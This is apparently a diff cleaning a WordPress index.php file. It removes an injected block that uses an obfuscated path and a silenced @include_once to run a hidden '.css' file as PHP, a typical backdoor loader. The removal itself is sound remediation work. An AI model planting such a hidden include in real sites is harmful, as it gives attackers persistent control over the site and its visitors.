@@ -1,9 +1,4 @@
 <?php
-/*600f3*/
-
-$r9n82 = "/home/kharadionline.com/\x70ublic_html/testing/.d5ae69ae.css"; if (TRUE){ @include_once /* e */ ($r9n82); }
-
-/*600f3*/
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
  * wp-blog-header.php which does and tells WordPress to load the theme.
